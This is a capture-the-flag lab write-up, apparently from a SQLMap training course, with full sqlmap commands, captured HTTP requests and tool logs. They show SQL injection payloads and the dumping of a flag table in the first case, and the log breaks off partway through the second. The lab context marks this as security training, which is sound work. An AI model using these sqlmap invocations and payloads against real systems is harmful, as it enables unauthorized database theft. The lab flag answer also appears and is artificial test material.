# Section 06: Attack Tuning

Module: 18. SQLMap Essentials

---

## Questions & Answers

### 1. What's the contents of table flag5? (Case #5)

Context:
- Capture and get the HTTP request
```bash
GET /case5.php?id=1 HTTP/1.1
Host: 154.57.164.82:30883
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://154.57.164.82:30883/case5.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
- Exploit with SQLMap full process:
```bash
[21:47:58] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[21:47:58] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[21:47:58] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:47:58] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[21:48:09] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' injectable 
[21:48:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:48:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:48:15] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[21:48:20] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[21:48:24] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[21:48:29] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[21:48:34] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[21:48:39] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[21:48:44] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[21:48:48] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[21:48:53] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[21:48:58] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[21:49:04] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[21:49:09] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[21:49:14] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[21:49:19] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[21:49:24] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[21:49:28] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[21:49:33] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[21:49:38] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[21:49:43] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[21:49:48] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[21:49:48] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 609 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: id=-2705 OR 1114=1114

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: id=1 OR (SELECT 9833 FROM (SELECT(SLEEP(5)))WJPm)
---
[21:49:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[21:49:54] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[21:49:54] [WARNING] your sqlmap version is outdated

[*] ending @ 21:49:54 /2026-09-08/
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-jly8u2dih3-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -r req5.txt --level=5 --risk=3 --batch --search -T flag5
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:54:12 /2026-09-08/

[21:54:12] [INFO] parsing HTTP request from 'req5.txt'
[21:54:12] [INFO] resuming back-end DBMS 'mysql' 
[21:54:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: id=-2705 OR 1114=1114

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: id=1 OR (SELECT 9833 FROM (SELECT(SLEEP(5)))WJPm)
---
[21:54:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
do you want sqlmap to consider provided table(s):
[1] as LIKE table names (default)
[2] as exact table names
> 1
[21:54:12] [INFO] searching tables LIKE 'flag5'
[21:54:12] [INFO] fetching number of databases with tables LIKE 'flag5'
[21:54:12] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[21:54:12] [INFO] retrieved: 4
[21:54:14] [INFO] retrieved: testdb
[21:54:23] [INFO] retrieved: 
[21:54:24] [INFO] retrieved: 
[21:54:24] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[21:54:25] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[21:54:25] [INFO] retrieved: 
[21:54:25] [INFO] retrieved: 
[21:54:26] [INFO] retrieved: 
[21:54:27] [INFO] retrieved: 
[21:54:28] [INFO] fetching number of tables LIKE 'flag5' in database 'testdb'
[21:54:28] [INFO] retrieved: 1
[21:54:29] [INFO] retrieved: flag5
[21:54:38] [INFO] fetching number of tables LIKE 'flag5' in database 'None'
[21:54:38] [INFO] retrieved: 0
[21:54:40] [WARNING] no tables LIKE 'flag5' in database 'None'
Database: testdb
[1 table]
+-------+
| flag5 |
+-------+

do you want to dump found table(s) entries? [Y/n] Y
which database(s)?
[a]ll (default)
[testdb]
[q]uit
> a
which table(s) of database 'testdb'?
[a]ll (default)
[flag5]
[s]kip
[q]uit
> a
[21:54:40] [INFO] fetching columns for table 'flag5' in database 'testdb'
[21:54:40] [INFO] retrieved: 2
[21:54:42] [INFO] retrieved: id
[21:54:45] [INFO] retrieved: content
[21:54:57] [INFO] fetching entries for table 'flag5' in database 'testdb'
[21:54:57] [INFO] fetching number of entries for table 'flag5' in database 'testdb'
[21:54:57] [INFO] retrieved: 1
[21:54:58] [INFO] retrieved: HTB{700amuch_r15k_bu7_w0r7h_17}
[21:55:53] [INFO] retrieved: 1
Database: testdb
Table: flag5
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{700amuch_r15k_bu7_w0r7h_17} |
+----+---------------------------------+

[21:55:55] [INFO] table 'testdb.flag5' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/flag5.csv'
[21:55:55] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[21:55:55] [WARNING] your sqlmap version is outdated

[*] ending @ 21:55:55 /2026-09-08/
```

**Answer:** `HTB{700amuch_r15k_bu7_w0r7h_17}`

---

### 2. What's the contents of table flag6? (Case #6)

Context:
- Capture the request and exploit with SQLMap:
```bash
┌─[eu-academy-2]─[10.10.15.97]─[htb-ac-2162140@htb-jly8u2dih3-htb-cloud-com]─[~]
└──╼ [★]$ sqlmap -r req6.txt --level=5 --risk=3 --batch --search -T flag6
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.6#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:00:37 /2026-09-08/

[22:00:37] [INFO] parsing HTTP request from 'req6.txt'
[22:00:37] [INFO] testing connection to the target URL
[22:00:38] [INFO] checking if the target is protected by some kind of WAF/IPS
[22:00:38] [INFO] testing if the target URL content is stable
[22:00:38] [INFO] target URL content is stable
[22:00:38] [INFO] testing if GET parameter 'col' is dynamic
[22:00:38] [INFO] GET parameter 'col' appears to be dynamic
[22:00:38] [WARNING] heuristic (basic) test shows that GET parameter 'col' might not be injectable
[22:00:39] [INFO] testing for SQL injection on GET parameter 'col'
[22:00:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:01:02] [WARNING] reflective value(s) found and filtering out
[22:01:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[22:01:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[22:01:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[22:02:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[22:02:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[22:02:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[22:02:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[22:02:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[22:02:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[22:02:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[22:03:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[22:03:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[22:03:20] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[22:03:38] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[22:03:57] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[22:04:13] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[22:04:33] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[22:04:50] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:05:10] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:05:26] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[22:05:46] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[22:06:03] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[22:06:21] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[22:06:38] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[22:06:56] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[22:07:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:07:13] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[22:07:13] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[22:07:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[22:07:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[22:07:14] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[22:07:15] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[22:07:15] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[22:07:16] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[22:07:16] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[22:07:17] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[22:07:17] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[22:07:18] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[22:07:18] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[22:07:19] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[22:07:19] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[22:07:20] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[22:07:20] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[22:07:21] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[22:07:21] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[22:07:22] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[22:07:22] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[22:07:23] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[22:07:23] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[22:07:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[22:07:25] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[22:07:25] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[22:07:25] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[22:07:26] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[22:07:27] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[22:07:28] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[22:07:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[22:07:30] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[22:07:31] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[22:07:32] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[22:07:33] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[22:07:34] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[22:07:35] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[22:07:36] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[22:07:37] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[22:07:38] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[22:07:56] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[22:08:09] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[22:08:09] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[22:08:22] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[22:08:35] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[22:08:47] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[22:09:00] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[22:09:13] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[22:09:26] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[22:09:39] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[22:09:52] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[22:10:05] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[22:10:18] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[22:10:31] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[22:10:44] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[22:10:57] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[22:11:10] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[22:11:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:11:36] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:11:49] [INFO] testing 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:11:49] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:12:03] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:12:16] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[22:12:29] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[22:12:42] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:12:54] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[22:13:07] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[22:13:14] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[22:13:26] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[22:13:36] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[22:13:49] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'
[22:13:59] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[22:14:12] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)'
[22:14:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[22:14:35] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)'
[22:14:45] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[22:14:57] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (XMLType)'
[22:15:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[22:15:19] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[22:15:29] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[22:15:41] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[22:15:51] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
[22:16:03] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
[22:16:13] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
[22:16:22] [INFO] testing 'Firebird OR error-based - WHERE or HAVING clause'
[22:16:31] [INFO] testing 'MonetDB AND error-based - WHERE or HAVING clause'
[22:16:39] [INFO] testing 'MonetDB OR error-based - WHERE or HAVING clause'
[22:16:48] [INFO] testing 'Vertica AND error-based - WHERE or HAVING clause'
[22:16:57] [INFO] testing 'Vertica OR error-based - WHERE or HAVING clause'
[22:17:05] [INFO] testing 'IBM DB2 AND error-based - WHERE or HAVING clause'
[22:17:14] [INFO] testing 'IBM DB2 OR error-based - WHERE or HAVING clause'
[22:17:23] [INFO] testing 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[22:17:36] [INFO] testing 'ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[22:17:48] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[22:17:57] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[22:17:57] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[22:17:57] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[22:17:57] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[22:17:58] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[22:17:58] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[22:17:58] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[22:17:58] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[22:17:59] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[22:17:59] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
[22:17:59] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)'
[22:17:59] [INFO] testing 'Oracle error-based - Parameter replace'
[22:18:00] [INFO] testing 'Firebird error-based - Parameter replace'
[22:18:00] [INFO] testing 'IBM DB2 error-based - Parameter replace'
[22:18:00] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[22:18:01] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[22:18:01] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[22:18:02] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[22:18:02] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[22:18:03] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[22:18:03] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[22:18:04] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[22:18:04] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[22:18:05] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[22:18:05] [INFO] testing 'Microsoft SQL Server/Sybase error-based - ORDER BY clause'
[22:18:05] [INFO] testing 'Oracle error-based - ORDER BY, GROUP BY clause'
[22:18:06] [INFO] testing 'Firebird error-based - ORDER BY clause'
[22:18:06] [INFO] testing 'IBM DB2 error-based - ORDER BY clause'
[22:18:07] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
[22:18:13] [INFO] testing 'Generic inline queries'
[22:18:14] [INFO] testing 'MySQL inline queries'
[22:18:14] [INFO] testing 'PostgreSQL inline queries'
[22:18:14] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[22:18:14] [INFO] testing 'Oracle inline queries'
[22:18:14] [INFO] testing 'SQLite inline queries'
[22:18:15] [INFO] testing 'Firebird inline queries'
[22:18:15] [INFO] testing 'ClickHouse inline queries'
[22:18:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:18:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[22:18:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[22:18:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[22:18:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[22:18:54] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[22:19:04] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[22:19:11] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[22:19:21] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[22:19:27] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[22:19:37] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[22:19:43] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[22:19:54] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[22:20:00] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
[22:20:07] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'
[22:20:17] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE)'
[22:20:27] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[22:20:33] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)'
[22:20:43] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
[22:20:50] [INFO] testing 'Oracle stacked queries (heavy query)'
[22:21:00] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)'
[22:21:06] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP)'
[22:21:16] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP - comment)'
[22:21:16] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP)'
[22:21:16] [INFO] testing 'IBM DB2 stacked queries (heavy query - comment)'
[22:21:23] [INFO] testing 'IBM DB2 stacked queries (heavy query)'
[22:21:33] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[22:21:39] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[22:21:49] [INFO] testing 'Firebird stacked queries (heavy query - comment)'
[22:21:56] [INFO] testing 'Firebird stacked queries (heavy query)'
[22:22:06] [INFO] testing 'SAP MaxDB stacked queries (heavy query - comment)'
[22:22:12] [INFO] testing 'SAP MaxDB stacked queries (heavy query)'
[22:22:22] [INFO] testing 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)'
[22:22:29] [INFO] testing 'HSQLDB >= 1.7.2 stacked queries (heavy query)'
[22:22:39] [INFO] testing 'HSQLDB >= 2.0 stacked queries (heavy query - comment)'
[22:22:45] [INFO] testing 'HSQLDB >= 2.0 stacked queries (heavy query)'
[22:22:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:23:08] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[22:23:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[22:23:33] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[22:23:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[22:23:54] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[22:24:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[22:24:11] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[22:24:20] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[22:24:33] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[22:25:19] [INFO] GET parameter 'col' appears to be 'MySQL > 5.0.12 AND time-based blind (heavy query)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[22:25:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:25:19] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[22:25:19] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[22:25:19] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[22:25:19] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[22:25:19] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[22:25:19] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[22:25:19] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[22:25:19] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[22:25:19] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[22:25:19] [INFO] checking if the injection point on GET parameter 'col' is a false positive
GET parameter 'col' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 5933 HTTP(s) requests:
---
Parameter: col (GET)
    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
